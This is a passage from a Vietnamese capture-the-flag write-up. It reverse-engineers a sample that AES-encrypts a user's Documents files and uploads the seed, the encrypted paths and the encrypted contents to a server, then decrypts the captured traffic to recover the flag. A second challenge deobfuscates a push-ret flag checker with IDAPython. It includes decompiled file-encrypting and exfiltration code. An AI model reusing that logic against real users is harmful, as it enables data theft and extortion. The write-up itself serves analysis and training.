  int n44; // ecx
  BYTE *pbDataa_1; // eax
  int n32_1; // edx
  _BYTE *v26; // ecx
  int v28; // [esp+18h] [ebp-7Ch]
  BOOL Final; // [esp+20h] [ebp-74h]
  HCRYPTPROV v30; // [esp+24h] [ebp-70h]
  char *i_2; // [esp+28h] [ebp-6Ch]
  BYTE *pt; // [esp+2Ch] [ebp-68h]
  FILE *Stream; // [esp+30h] [ebp-64h]
  BYTE pbDataa[4]; // [esp+34h] [ebp-60h] BYREF
  int n26128; // [esp+38h] [ebp-5Ch]
  int n32; // [esp+3Ch] [ebp-58h]
  __int128 v37; // [esp+40h] [ebp-54h]
  __int128 v38; // [esp+50h] [ebp-44h]
  char *FileNamea; // [esp+60h] [ebp-34h] BYREF
  HCRYPTPROV phProv; // [esp+64h] [ebp-30h] BYREF
  DWORD pdwDataLen; // [esp+68h] [ebp-2Ch] BYREF
  HCRYPTKEY phKey; // [esp+6Ch] [ebp-28h] BYREF
  _OWORD v43[2]; // [esp+70h] [ebp-24h] BYREF

  v30 = 0;
  v28 = 0;
  v5 = (char *)v43 + 1;
  FileNamea = FileName;
  phProv = 0;
  pdwDataLen = ~(unsigned int)seed;
  v6 = seed + 2;
  phKey = 0;
  v7 = -2 - (_BYTE)seed;
  do
  {
    *(v5 - 1) = *(v6 - 2) ^ iv[(v7 + (_BYTE)v6) & 0xF];
    *v5 = *(v6 - 1) ^ iv[(~(_BYTE)seed + (_BYTE)v6) & 0xF];
    v8 = (_BYTE)v5 + 2 - ((_DWORD)v43 + 1);
    v5 += 4;
    v6[(char *)v43 - (char *)seed] = *v6 ^ iv[v8 & 0xF];
    v6[(char *)v43 + 1 - (char *)seed] = v6[1] ^ iv[((_BYTE)v6 + 1 - (_BYTE)seed) & 0xF];
    v6 += 4;
    v7 = -2 - (_BYTE)seed;
  }
  while ( (int)&v6[-2 - (_DWORD)seed] < 32 );
  v9 = 0;
  Stream = fopen(FileNamea, "rb");
  ct = 0;
  Buffer_2 = 0;
  if ( !Stream )
    return 0;
  // ;0xf0000000 -> CRYPT_VERIFYCONTEXT
  if ( !CryptAcquireContextA(&phProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18u, 0xF0000000) )
  {
    fclose(Stream);
    return 0;
  }
  *(_DWORD *)pbDataa = 520;
  n26128 = 0x6610;
  v37 = v43[0];
  n32 = 32;
  v38 = v43[1];
  if ( CryptImportKey(phProv, pbDataa, 0x2Cu, 0, 0, &phKey) )
  {
    FileNamea = (char *)1;
    if ( CryptSetKeyParam(phKey, KP_MODE, (const BYTE *)&FileNamea, 0) )
    {
      if ( CryptSetKeyParam(phKey, KP_IV, iv, 0) )
      {
        fseek(Stream, 0, 2);
        v13 = ftell(Stream);
        fseek(Stream, 0, 0);
        v9 = v13 + 16;
        ct = (char *)malloc(v13 + 16);
        i_2 = ct;
        if ( ct )
        {
          Buffer = (BYTE *)malloc(0x1000u);
          Buffer_2 = Buffer;
          pt = Buffer;
          if ( Buffer )
          {
            n0x1000 = fread(Buffer, 1u, 0x1000u, Stream);
            if ( n0x1000 )
            {
              while ( 1 )
              {
                if ( n0x1000 < 0x1000 || (Final = 0, feof(Stream)) )
                  Final = 1;
                if ( n0x1000 + v30 + 16 > v9 )
                {
                  i_3 = (char *)realloc(ct, 2 * v9);
                  if ( !i_3 )
                    goto LABEL_27;
                  v9 *= 2;
                  ct = i_3;
                  i_2 = i_3;
                }
                pbData = &ct[v30];
                memcpy(pbData, pt, n0x1000);
                pdwDataLen = n0x1000;
                if ( !CryptEncrypt(phKey, 0, Final, 0, (BYTE *)pbData, &pdwDataLen, n0x1000 + 16) )
                  break;
                v18 = pdwDataLen + v30;
                v30 += pdwDataLen;
                if ( Final )
                {
                  ct = i_2;
                  goto LABEL_25;
                }
                ct = i_2;
                n0x1000 = fread(pt, 1u, 0x1000u, Stream);
                if ( !n0x1000 )
                {
                  v18 = v30;
                  goto LABEL_25;
                }
              }
              ct = i_2;
LABEL_27:
              Buffer_2 = pt;
            }
            else
            {
              v18 = 0;
LABEL_25:
              Buffer_2 = pt;
              v28 = 1;
              *a2 = ct;
              ct = 0;
              *p_phProv = v18;
            }
          }
        }
        else
        {
          Buffer_2 = 0;
        }
      }
    }
  }
  fclose(Stream);
  if ( phKey )
    CryptDestroyKey(phKey);
  if ( phProv )
    CryptReleaseContext(phProv, 0);
  free = ::free;
  if ( Buffer_2 )
  {
    n4096 = 4096;
    Buffer_3 = Buffer_2;
    do
    {
      *Buffer_3++ = 0;
      --n4096;
    }
    while ( n4096 );
    ::free(Buffer_2);
    free = ::free;
  }
  if ( ct )
  {
    for ( i = ct; v9; --v9 )
      *i++ = 0;
    free(ct);
  }
  n44 = 44;
  pbDataa_1 = pbDataa;
  do
  {
    *pbDataa_1++ = 0;
    --n44;
  }
  while ( n44 );
  n32_1 = 32;
  v26 = v43;
  do
  {
    *v26++ = 0;
    --n32_1;
  }
  while ( n32_1 );
  return v28;
}
```
</details>

File được mã hóa **AES mode CBC** với `key = seed ^ iv`:

![image](/assets/posts/KCSC_Recruitment_01_2026/27.png)

Mã hóa base64 `seed` và gửi lên route `/208f98eb44b7056e37d57872ee58ca6d660d1c14475acf9e888c07a5402d0bc0`:

![image](/assets/posts/KCSC_Recruitment_01_2026/28.png)

![image](/assets/posts/KCSC_Recruitment_01_2026/29.png)

Mã hóa **AES Mode ECB** path file với `key=seed`:

```cpp
int __fastcall encrypt_path_file(const char *Src, BYTE **p_pbBinarya, _DWORD *p_cbBinary, __int128 *seed)
{
  size_t Size; // esi
  __int128 v6; // xmm0
  __int128 v7; // xmm0
  BYTE *pbBinary; // eax
  BYTE *pbBinary_1; // edi
  DWORD v10; // ecx
  BYTE *pbData_2; // edx
  DWORD n4096; // ebx
  int n16; // eax
  BYTE *pbBinary_3; // eax
  int v15; // ecx
  int n44; // ecx
  BYTE *pbData_3; // eax
  HCRYPTKEY phKey_1; // [esp-4h] [ebp-68h]
  size_t Size_1; // [esp+14h] [ebp-50h]
  size_t Size_2; // [esp+18h] [ebp-4Ch]
  DWORD v23; // [esp+1Ch] [ebp-48h]
  BYTE *pbBinary_2; // [esp+20h] [ebp-44h]
  DWORD pdwDataLen; // [esp+24h] [ebp-40h] BYREF
  BYTE pbData[4]; // [esp+28h] [ebp-3Ch] BYREF
  int n0x6610; // [esp+2Ch] [ebp-38h]
  int n32; // [esp+30h] [ebp-34h]
  __int128 v29; // [esp+34h] [ebp-30h]
  __int128 v30; // [esp+44h] [ebp-20h]
  BYTE pbData_1[4]; // [esp+54h] [ebp-10h] BYREF
  HCRYPTPROV phProv; // [esp+58h] [ebp-Ch] BYREF
  HCRYPTKEY phKey; // [esp+5Ch] [ebp-8h] BYREF

  phProv = 0;
  phKey = 0;
  Size = strlen(Src);
  // ;0xf0000000 -> CRYPT_VERIFYCONTEXT
  if ( !CryptAcquireContextA(&phProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18u, 0xF0000000) )
    return 0;
  v6 = *seed;
  *(_DWORD *)pbData = 520;
  n0x6610 = 0x6610;
  v29 = v6;
  v7 = seed[1];
  n32 = 32;
  v30 = v7;
  if ( !CryptImportKey(phProv, pbData, 0x2Cu, 0, 0, &phKey) )
  {
LABEL_22:
    CryptReleaseContext(phProv, 0);
    return 0;
  }
  *(_DWORD *)pbData_1 = 2;
  if ( !CryptSetKeyParam(phKey, KP_MODE, pbData_1, 0)
    || (Size_2 = Size + 16, pbBinary = (BYTE *)malloc(Size + 16), (pbBinary_1 = pbBinary) == 0) )
  {
LABEL_21:
    CryptDestroyKey(phKey);
    goto LABEL_22;
  }
  memcpy(pbBinary, Src, Size);
  v10 = 0;
  v23 = 0;
  pbData_2 = pbBinary_1;
  pbBinary_2 = pbBinary_1;
  if ( Size )
  {
    while ( 1 )
    {
      n4096 = 4096;
      Size_1 = Size;
      if ( Size < 0x1000 )
        n4096 = Size;
      n16 = 0;
      pdwDataLen = n4096;
      if ( Size == n4096 )
        n16 = 16;
      if ( !CryptEncrypt(phKey, 0, Size == n4096, 0, pbData_2, &pdwDataLen, n4096 + n16) )
        break;
      Size -= n4096;
      pbData_2 = &pbBinary_2[pdwDataLen];
      v10 = pdwDataLen + v23;
      pbBinary_2 += pdwDataLen;
      v23 += pdwDataLen;
      if ( Size_1 == n4096 )
        goto LABEL_17;
      if ( v10 + 16 > Size_2 )
      {
        Size_2 *= 2;
        pbBinary_3 = (BYTE *)realloc(pbBinary_1, Size_2);
        if ( !pbBinary_3 )
          break;
        v15 = pbBinary_3 - pbBinary_1;
        pbBinary_1 = pbBinary_3;
        pbData_2 = &pbBinary_2[v15];
        pbBinary_2 += v15;
      }
      if ( !Size )
      {
        v10 = v23;
        goto LABEL_17;
      }
    }
    free(pbBinary_1);
    goto LABEL_21;
  }
LABEL_17:
  phKey_1 = phKey;
  *p_pbBinarya = pbBinary_1;
  *p_cbBinary = v10;
  CryptDestroyKey(phKey_1);
  CryptReleaseContext(phProv, 0);
  n44 = 44;
  pbData_3 = pbData;
  do
  {
    *pbData_3++ = 0;
    --n44;
  }
  while ( n44 );
  return 1;
}
```

![image](/assets/posts/KCSC_Recruitment_01_2026/30.png)

Mã hóa base64 path file và gửi lên route `/b28d07a710b993c17dbbc740f34e4a9ad576a7334e87972cc207dcf5ed961736`:

![image](/assets/posts/KCSC_Recruitment_01_2026/31.png)
![image](/assets/posts/KCSC_Recruitment_01_2026/32.png)

Gán `iv` vào cuối nội dung file mã hóa:

![image](/assets/posts/KCSC_Recruitment_01_2026/33.png)

Cuối cùng mã hóa base64 (`enc_file + iv`) và gửi lên route `\a0a8a3456e7906ec55cdd7d2d4148e693555db6dcb5828a30e93c699a66e801a`:

![image](/assets/posts/KCSC_Recruitment_01_2026/34.png)
Tóm lại, `win%updater.exe` lần lượt duyệt các file trong folder `My Documents` thực hiện luồng như sau: 
* gen random `seed` và `iv` 
* mã hóa file với  **AES mode CBC** (`key = seed ^ iv`)
* gửi base64 `seed` lên route `\208f98eb44b7056e37d57872ee58ca6d660d1c14475acf9e888c07a5402d0bc0`
* mã hóa path file với **AES mode ECB** (`key=seed`)
* gửi base64 path lên route `\b28d07a710b993c17dbbc740f34e4a9ad576a7334e87972cc207dcf5ed961736`
* gửi base64 `enc_file + iv` lên route `\a0a8a3456e7906ec55cdd7d2d4148e693555db6dcb5828a30e93c699a66e801a`

Với luồng như trên dễ dàng viết script khôi phục lại các file và path:

```python
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode

cmd = [
    "tshark", "-r", "captured.pcapng",
    "-Y", "http.request.method == \"POST\"",
    "-T", "fields",
    "-e", "frame.number",
    "-e", "http.request.uri",
    "-e", "http.file_data",
]

out = subprocess.check_output(cmd, text=True)
open("dump_http_post.txt", "w").write(out)
for line in out.splitlines():
    no, uri, data = (line.split("\t") + ["", "", ""])[:3]
    # print(data)
    # break
    dec = b64decode(bytes.fromhex(data))
    if uri == "/208f98eb44b7056e37d57872ee58ca6d660d1c14475acf9e888c07a5402d0bc0":
        seed = dec
        print("\nseed:", seed.hex())
    elif uri == "/b28d07a710b993c17dbbc740f34e4a9ad576a7334e87972cc207dcf5ed961736":
        path = AES.new(seed, AES.MODE_ECB).decrypt(dec)
        path = unpad(path, AES.block_size).decode()
        file_name = path.split('\\')[-1]
        print("path file:", path)
    elif uri == "/a0a8a3456e7906ec55cdd7d2d4148e693555db6dcb5828a30e93c699a66e801a":
        iv = dec[-16:]
        print("iv:", iv.hex())
        ct = dec[:-16]
        # print("ct:", ct.hex()[:10])
        key = bytes([seed[i] ^ iv[i % 16] for i in range(len(seed))])
        print("key:", key.hex())
        pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
        pt = unpad(pt, AES.block_size)
        if pt.startswith(b'\x89PNG\r\n\x1a\n'):
            open(f"{file_name}", "wb").write(pt)
        elif pt.startswith(b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01'):
            open(f"{file_name}", "wb").write(pt)
        else:
            print(pt[:10])
```

log:
```
seed: 8c24b81ee8de25546dd0d1fc00ee79932dbeefc927d312485ecf45b805f9e603                                                                         
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\alo.jpg                                                                                      
iv: 1ea6390dc734cfa8dc58461ed851ee46                                                                                                           
key: 928281132feaeafcb18897e2d8bf97d53318d6c4e0e7dde0829703a6dda80845                                                                          

seed: b59f63e1a4bfbfcc2b0eae04bda3259a8e2f851520f299bf6320ff50d149d53a
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\benj.jpg
iv: 303848e85847c068683e383d2859e7dc
key: 85a72b09fcf87fa44330963995fac246be17cdfd78b559d70b1ec76df91032e6

seed: 27c7de36859de7547845116c22d1c9d594627d6be0b637a27c20c40487bdea93
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\co_dat_k.jpg
iv: b80030327b4c314eebdcb1b21be76bf7
key: 9fc7ee04fed1d61a9399a0de3936a2222c624d599bfa06ec97fc75b69c5a8164

seed: 594a3a9d7add40a9b58c978f3e2309e51cf13dd5a3e58ced99e74ca3e1d18446
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\desktop.ini
iv: 0f866527cef4ff96ce74022033bf9c65
key: 56cc5fbab429bf3f7bf895af0d9c9580137758f26d11737b57934e83d26e1823
b'\xff\xfe\r\x00\n\x00[\x00.\x00'

seed: 572203aebec8401d409229d40c89e26f60826b41c53dac539714882372c811c2
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\du_trinh_k.jpg
iv: 33fe202693990851b3c560796907c0bb
key: 64dc23882d51484cf35749ad658e22d4537c4b6756a4a40224d1e85a1bcfd179

seed: dd33a3ed8f2b21262366a507db67f170c3ebdb673e6825dc57eaa7fda1d0a6c0
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\ena_my_beloved.jpg
iv: e45849ee9615a2c5d5e1ac160756f880
key: 396bea03193e83e3f6870911dc3109f027b39289a87d8719820b0beba6865e40

seed: 58cb6ed8b91c9bfc753505da190225e52d83ddeb966d3e9d8cbe6271a8114910
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\ena_my_beloved1.jpg
iv: 9ff8d527df6700e4dc1699b115651183
key: c733bbff667b9b18a9239c6b0c673466b27b08cc490a3e7950a8fbc0bd745893

seed: 063c111362d4b5363439c056e8658b3029b068b93be78b35019ab41f3a4b90aa
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\Flag_Checker.exe
iv: 814dd8dd90e46b71c06a188b32519aa4
key: 8771c9cef230de47f453d8ddda341194a8fdb064ab03e044c1f0ac94081a0a0e
b'MZ\x90\x00\x03\x00\x00\x00\x04\x00'

seed: 3579b09bd7a0d5f5b63dbbcd001ab0e898aa16b47114a4499536d1b514d726b9
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\homeless.jpg
iv: e6284b7d357487387bebb67d3483d0f0
key: d351fbe6e2d452cdcdd60db0349960187e825dc944602371eedd67c82054f649

seed: ca2dc3bb78e55e5d0f10ed2bc354bd458718c40577c71cd2ce65cf88350e8a65
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\huyst5k.jpg
iv: 2637f022b3e836f7d5f0fc9f9df883cc
key: ec1a3399cb0d68aadae011b45eac3e89a12f3427c42f2a251b953317a8f609a9

seed: dc156fad8b4f526189c04bc700f90e1b71bdef1509cc75e5a19f1f659cf0746a
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\image.png
iv: 6bfd76c280c99656f5e8b928903b0c73
key: b7e8196f0b86c4377c28f2ef90c202681a4099d78905e3b35477a64d0ccb7819

seed: bd4af30188d3141daa3c0b07d610c4316fd0f56af4d071e043e37e72414136f4
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\iykyk.jpg
iv: 2bdef14d4ff1fc1d92c7839cf236577b
key: 9694024cc722e80038fb889b2426934a440e0427bb218dfdd124fdeeb377618f

seed: 17ece18931929f2056a2cec51c95bdb7850399bce38d9b51024073b433b4f176
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\kernel32.dll
iv: 692307ac03f8afb5f61c32c9dd7a337b
key: 7ecfe625326a3095a0befc0cc1ef8eccec209e10e07534e4f45c417deecec20d
b'MZ\x90\x00\x03\x00\x00\x00\x04\x00'

seed: b390593e4d9d984240fdfd1eaf2fb24af555ac1ceba6bc03d7ce3cb6363557a6
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\leaked.jpg
iv: fe0eca10dd31cddc874c9db7b526c12b
key: 4d9e932e90ac559ec7b160a91a0973610b5b660c369771df5082a1018313968d

seed: a3dc29f30abb5c269f460e1e58c652d187f74f5561199ae25c647a64d78ccdee
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\nun_na_na_na.jpg
iv: 40f2ab2b4f37e9da9e196911c52ef333
key: e32e82d8458cb5fc015f670f9de8a1e2c705e47e2e2e7338c27d137512a23edd

seed: 38da67f626be19262542e8e84083c920869f1052135bcff7aa7c3b9a630a5b5a
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\pbvm.exe
iv: e27081dfe36094e6e3dace1e3ad04b79
key: daaae629c5de8dc0c69826f67a53825964ef918df03b5b1149a6f58459da1023
b'MZ\x90\x00\x03\x00\x00\x00\x04\x00'

seed: e0843d5d41ab32ab572802c16ad72d667ce348b122ddcfbddf899d47635f6af0
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\shopee.jpg
iv: 620cbe247c79e8d352562d7daef99887
key: 828883793dd2da78057e2fbcc42eb5e11eeff6955ea4276e8ddfb03acda6f277

seed: 6dcad3b4dd9cca818d92da268cef8b710226c465e3d3eaf466f4b8c9ae430533
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\sv.txt
iv: 2a534e28b9aa813921064d0f0c72ae8e
key: 47999d9c64364bb8ac949729809d25ff28758a4d5a796bcd47f2f5c6a231abbd
b'me may beo'

seed: 904fdf26c0db77193535a20dbcb547a935e39942e07c7a2b993f9d201378e2c4
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\tao_khong_the_chung_minh.jpg
iv: ef803b6f3aee232091ab5017602b9fb0
key: 7fcfe449fa355439a49ef21adc9ed819da63a22dda92590b0894cd3773537d74

seed: f05f6f95a4d5adc39a97e043dde96e1bec344c91d4c7ce9eed90a0710c300a0e
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\thats_my_mutual.jpg
iv: 729c6648b0f2db0cf768676b686b5ee8
key: 82c309dd142776cf6dff8728b58230f39ea82ad9643515921af8c71a645b54e6

seed: 9322ca5aa0d6207245d45c5208deb64c9486f90e673fc6fe41c23566ebeffff9
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\toi_k_biet_dieu_do.jpg
iv: 3acb139ff42130b2e8442ea492d12db3
key: a9e9d9c554f710c0ad9072f69a0f9bffae4dea91931ef64ca9861bc2793ed24a

seed: 2677999de1fcdf0ed128e2fd3b84609339e94283c149a774a97a5f15f2e4fe33
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\troll.jpg
iv: d88a8b67c6965b2b4219400b4ea03ac3
key: fefd12fa276a84259331a2f675245a50e163c9e407dffc5feb631f1ebc44c4f0

seed: 32b370467c3b8b3c83883bee722b667422f59e1723ce8015f83738cbbb6f4a02
path file: C:\Users\pbvm_nu`n_na'_na_na\Documents\zasdwqvs_du_trinh_k.png
iv: 91605f71fb6c9ab68bf880840a9fc8b6
key: a3d32f378757118a0870bb6a78b4aec2b395c166d8a21aa373cfb84fb1f082b4
```

Ảnh `zasdwqvs_du_trinh_k.png` chứa flag:
![image](/assets/posts/KCSC_Recruitment_01_2026/35.png)

```
KCSC{nu`n_n4'_n4_n4_4nh_phu0cbv_he._he._he._a_pbvm_df1930f7dae7cc0ee5754f4d67171308}
```

## easy_obf

![image](/assets/posts/KCSC_Recruitment_01_2026/36.png)

Đúng như tên challenge thì luồng thực thi bị obfuscate theo cơ chế **push - ret**:

`push 40001013h`: đẩy giá trị `40001013h` (4 byte thấp của địa chỉ 64-bit) vào stack:

![image](/assets/posts/KCSC_Recruitment_01_2026/37.png)

`mov dword ptr [rsp+4], 1`: Thay đổi 4 byte cao của giá trị vừa đẩy vào stack thành **0x140001013**.
Lệnh `retn` sẽ lấy giá trị trên đỉnh stack làm địa chỉ nhảy tới --> `jmp 0x140001013`

![image](/assets/posts/KCSC_Recruitment_01_2026/38.png)

Viết script IDApython phân tích tổng quát luồng:

```python
sections = [
    (0x140001000, 0x140003000, ".text"),
    (0x140006000, 0x140009000, ".upx0"),
    (0x140009000, 0x14000c000, ".upx1"),
    (0x14000c000, 0x14000f000, ".upx2"),
]

patterns = []
for s, e, n in sections:
    p =  []
    while s < e-14:
        if get_wide_byte(s) == 0x68: # push imm32
            if get_bytes(s+5, 8) == bytes.fromhex("C7 44 24 04 01 00 00 00"):
                if get_wide_byte(s+13) == 0xC3: # ret
                    jmp = 0x140000000 | get_wide_dword(s+1)
                    p.append((f"s: 0x{s:x}", f"jmp: 0x{jmp:x}"))
                    s += 14
                    continue
        s += 1
    print(f"\n{n}: {len(p)}\n{p}")
    patterns.extend(p)
```

Quan sát output thì có thể thấy tại segment **.text** sẽ thực thi lần lượt đoạn obfuscate liên tục (**push-mov-ret**) theo địa chỉ `start-jmp` và ở cuối thì nó sẽ jump tới luồng thực thi thực sự

![image](/assets/posts/KCSC_Recruitment_01_2026/39.png)

![image](/assets/posts/KCSC_Recruitment_01_2026/40.png)

Tức là từ segment **.upx0, .upx1, .upx2** trở đi thì chương trình sẽ thực thi những dòng code thực sự kèm obfuscate. 
Như vậy ta có thể patch nop đi segment **.text** nhưng chừa lại đoạn cuối để nó jmp tới chỗ có thể tạm gọi là **OEP**.

```python
for i in range(0x140001000, 0x1400021e7):
    patch_byte(i, 0x90)
```

Ở các segment còn lại dù cho nó đã là phần thực thi thật sự nhưng vẫn bị obfuscate nặng vì mỗi lần chỉ có 1 dòng real được thực thi sau đó lại là cơ chế **push - mov - ret** jump tới địa chỉ thực thi nên ta có thể lợi dụng điều này chuyển nó trực tiếp thành `jmp address` giúp create function và quan sát dễ dàng hơn:

```python
sections = [
    (0x140001000, 0x140003000, ".text"),
    (0x140006000, 0x140009000, ".upx0"),
    (0x140009000, 0x14000c000, ".upx1"),
    (0x14000c000, 0x14000f000, ".upx2"),
]

patterns = []
for s, e, n in sections:
    p =  []
    while s < e-14:
        if get_wide_byte(s) == 0x68:
            if get_bytes(s+5, 8) == bytes.fromhex("C7 44 24 04 01 00 00 00"):
                if get_wide_byte(s+13) == 0xC3:
                    jmp = 0x140000000 | get_wide_dword(s+1)
                    p.append((f"s: 0x{s:x}", f"jmp: 0x{jmp:x}"))
                    s += 14
                    continue
        s += 1
    print(f"\n{n}: {len(p)}\n{p}")
    patterns.extend(p)

for i in range(0x140001000, 0x1400021e7):
    patch_byte(i, 0x90)

for p in patterns:
    addr = int(p[0].split("0x")[1], 16)
    jmp = int(p[1].split("0x")[1], 16)
    rel = jmp - (addr + 5)
    if rel < -0x80000000 or rel > 0x7FFFFFFF:
        continue
    for i in range(14):
        del_items(addr + i, DELIT_SIMPLE)
    patch_byte(addr, 0xE9)
    patch_dword(addr + 1, rel & 0xFFFFFFFF)
    for i in range(5, 16):
        patch_byte(addr + i, 0x90)
```

Đây là **sub_140006598** cũng tức là **main** sau khi debug và rename biến + hàm bằng tay 100%:

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  LPWSTR cmd; // rax
  int i; // [rsp+34h] [rbp-3A4h]
  int j; // [rsp+38h] [rbp-3A0h]
  DWORD NumberOfCharsWritten; // [rsp+3Ch] [rbp-39Ch] BYREF
  _DWORD _n[2]; // [rsp+40h] [rbp-398h] BYREF
  char Wrong[8]; // [rsp+48h] [rbp-390h] BYREF
  CHAR alstrlenW[16]; // [rsp+50h] [rbp-388h] BYREF
  CHAR aExitProcess[16]; // [rsp+60h] [rbp-378h] BYREF
  CHAR aShell32_dll[16]; // [rsp+70h] [rbp-368h] BYREF
  char aLoadLibraryA[16]; // [rsp+80h] [rbp-358h] BYREF
  CHAR aGetStdHandle[16]; // [rsp+90h] [rbp-348h] BYREF
  CHAR aWriteConsoleA[16]; // [rsp+A0h] [rbp-338h] BYREF
  char aGetProcAddress[16]; // [rsp+B0h] [rbp-328h] BYREF
  char Correct[16]; // [rsp+C0h] [rbp-318h] BYREF
  CHAR aGetCommandLineW[16]; // [rsp+D0h] [rbp-308h] BYREF
  CHAR aCommandLineToArgvW[24]; // [rsp+E0h] [rbp-2F8h] BYREF
  _BYTE ct[24]; // [rsp+F8h] [rbp-2E0h]
  char msg[32]; // [rsp+110h] [rbp-2C8h] BYREF
  int check; // [rsp+130h] [rbp-2A8h]
  int len_flag; // [rsp+134h] [rbp-2A4h]
  __int64 kernel32_dll; // [rsp+138h] [rbp-2A0h]
  FARPROC (__stdcall *GetProcAddress)(HMODULE, LPCSTR); // [rsp+140h] [rbp-298h]
  HANDLE hConsoleOutput; // [rsp+148h] [rbp-290h]
  BOOL (__stdcall *WriteConsoleA)(HANDLE, const void *, DWORD, LPDWORD, LPVOID); // [rsp+150h] [rbp-288h]
  int pNumArgs; // [rsp+158h] [rbp-280h] BYREF
  BOOL v29; // [rsp+15Ch] [rbp-27Ch]
  void (__stdcall __noreturn *ExitProcess)(UINT); // [rsp+160h] [rbp-278h]
  int len_ct; // [rsp+168h] [rbp-270h]
  __int64 szArglist; // [rsp+170h] [rbp-268h]
  int key[10]; // [rsp+178h] [rbp-260h] BYREF
  HMODULE shell32_dll; // [rsp+1A0h] [rbp-238h]
  HANDLE (__stdcall *GetStdHandle)(DWORD); // [rsp+1A8h] [rbp-230h]
  LPWSTR (__stdcall *GetCommandLineW)(); // [rsp+1B0h] [rbp-228h]
  LPWSTR *(__stdcall *CommandLineToArgvW)(LPCWSTR, int *); // [rsp+1B8h] [rbp-220h]
  int (__stdcall *lstrlenW)(LPCWSTR); // [rsp+1C0h] [rbp-218h]
  HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // [rsp+1C8h] [rbp-210h]
  _BYTE matrix[256]; // [rsp+1D0h] [rbp-208h] BYREF
  _BYTE enc_matrix[264]; // [rsp+2D0h] [rbp-108h] BYREF

  key[0] = 6;
  key[1] = 24;
  key[2] = 1;
  key[3] = 13;
  key[4] = 16;
  key[5] = 10;
  key[6] = 20;
  key[7] = 17;
  key[8] = 15;
  ct[0] = 0xE9;
  ct[1] = 0xAF;
  ct[2] = 0x12;
  ct[3] = 0x2D;
  ct[4] = 0x6B;
  ct[5] = 0x44;
  ct[6] = 0x51;
  ct[7] = 0xEC;
  ct[8] = 0x49;
  ct[9] = 0x5B;
  ct[10] = 0xD1;
  ct[11] = 0x3E;
  ct[12] = 0x8F;
  ct[13] = 0xEA;
  ct[14] = 0x56;
  ct[15] = 0x1A;
  ct[16] = 0x94;
  ct[17] = 0x11;
  ct[18] = 0x12;
  ct[19] = 0xEC;
  ct[20] = 0xC2;
  ct[21] = 0xA4;
  ct[22] = 0xDA;
  ct[23] = 0x9D;
  len_ct = 24;
  strcpy(aLoadLibraryA, "LoadLibraryA");
  strcpy(aGetProcAddress, "GetProcAddress");
  strcpy(aGetStdHandle, "GetStdHandle");
  strcpy(aWriteConsoleA, "WriteConsoleA");
  strcpy(aExitProcess, "ExitProcess");
  strcpy(aGetCommandLineW, "GetCommandLineW");
  strcpy(alstrlenW, "lstrlenW");
  strcpy(aShell32_dll, "Shell32.dll");
  strcpy(aCommandLineToArgvW, "CommandLineToArgvW");
  strcpy(msg, "Usage: <chall.exe> <flag>\n");
  strcpy(Wrong, "Wrong!\n");
  strcpy(Correct, "Correct!\nKCSC{");
  strcpy(_n, "}\n");
  memset(matrix, 0, sizeof(matrix));
  memset(enc_matrix, 0, 0x100u);
  kernel32_dll = resolve_kernel32();
  LoadLibraryA = resolveAPI(kernel32_dll, aLoadLibraryA);
  GetProcAddress = resolveAPI(kernel32_dll, aGetProcAddress);
  GetStdHandle = (GetProcAddress)(kernel32_dll, aGetStdHandle);
  WriteConsoleA = (GetProcAddress)(kernel32_dll, aWriteConsoleA);
  ExitProcess = (GetProcAddress)(kernel32_dll, aExitProcess);

  GetCommandLineW = (GetProcAddress)(kernel32_dll, aGetCommandLineW);
  lstrlenW = (GetProcAddress)(kernel32_dll, alstrlenW);
  shell32_dll = (LoadLibraryA)(aShell32_dll);
  CommandLineToArgvW = (GetProcAddress)(shell32_dll, aCommandLineToArgvW);
  pNumArgs = 0;
  hConsoleOutput = (GetStdHandle)(STD_OUTPUT_HANDLE);
  cmd = GetCommandLineW();
  szArglist = (CommandLineToArgvW)(cmd, &pNumArgs);
  if ( pNumArgs != 2 )
  {
    (WriteConsoleA)(hConsoleOutput, msg, 25, &NumberOfCharsWritten, 0);
    (ExitProcess)(1);
  }
  len_flag = (lstrlenW)(*(szArglist + 8));
  if ( len_flag != 23 )
  {
    (WriteConsoleA)(hConsoleOutput);
    (ExitProcess)(1);
  }
  for ( i = 0; i < len_flag; ++i )
    matrix[i] = *(*(szArglist + 8) + 2LL * i);
  matrix[23] = 0;
  mul_matrix(matrix, enc_matrix, 24, key);
  check = 1;
  for ( j = 0; j < len_ct; ++j )
  {
    v29 = enc_matrix[j] == ct[j];
    check &= v29;
  }
  if ( !check )
  {
    (WriteConsoleA)(hConsoleOutput);
    (ExitProcess)(1);
  }
  (WriteConsoleA)(hConsoleOutput, Correct, 14, &NumberOfCharsWritten, 0);
  for ( _n[1] = 0; _n[1] < len_flag; ++_n[1] )
    (WriteConsoleA)(hConsoleOutput);
  (WriteConsoleA)(hConsoleOutput);
  (ExitProcess)(0);
  return ret_0();
}
```

